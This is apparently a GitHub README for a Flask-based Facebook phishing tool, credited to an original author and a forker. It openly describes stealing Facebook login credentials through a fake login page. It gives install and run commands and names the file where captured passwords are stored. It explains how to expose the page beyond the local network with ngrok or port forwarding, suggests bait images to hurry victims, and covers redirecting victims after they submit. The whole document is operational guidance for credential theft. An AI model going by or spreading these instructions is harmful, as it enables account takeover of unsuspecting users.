## Facebook Phishing
**Original Author** : Arslan Mughal

**BY**: arjunindia

**original repository** : https://github.com/arslanmughal5566/facebook_phishing

## About Script :

With this script you can perform Facebook login credentials stealing with some social engineering skills.  

## requirements :

1 : [Python3.x](https://www.python.org/downloads/)
2 : Flask
To install Flask open terminal and type the following command ,

*user@repo~#*  **pip3 install flask**



make sure that before installing flask you have [python 3](https://www.python.org/downloads/) install , if you are using windows or macOs then first download and install [python3](https://www.python.org/downloads/) 

## usage :
clone the repository and open the terminal in source folder and run **app.py** 

user@repo~# python3 **app.py**

now open your browser and go to 0.0.0.0 or localhost or your lan ip.

facebook login page will appear type your credentials and hit login you will see nothing will be happen but stick with me :)


Go the source folder and then got database folder you will find one file name db_1 : 

**../database/db_1**

Open that and the credentials you have type in login page will be store in **db_1**  file 

 Now this is how you can attack on the same network but you can also do this attack out of Network using [Ngrok]
 (https://ngrok.com/) 
 
 YOU CAN DEFINITELY USE PORT FORWARDING. PORT FORWARD PORT 80 (HTTP SERVER PORT) AND NOW YOU CAN USE THE PAGE THROUGH WAN.


you can also attach some sort of image or any thing else with the link so that user immediately enter the credentials 

# fb-phisher-p


## New additions from the original code:
**1)** Made the page Mobile-Friendly.

**2)** Made another page **b.html** to which the page will be redirected after submission. Change the url var in the file b.html inside templates folder to the webpage you want the victim to be redirected.

## New UPDATE!

=>ADDED ./install.sh. now if you install with the script, you can use the command 'facebooker' to launch the tool.
    you can install the script by:-
    user@repo:~# cd fb-phisher-python
    user@repo:fb-phisher-python# chmod +x install,sh
    user@repo:fb-phisher-python# ./install.sh
    now you can run by typing 'facebooker'
    user@repo:~# facebooker
=>ADDED EXTRA FUNCTIN, i.e. a new function to easily modify the link to be redirected to. install with install.sh
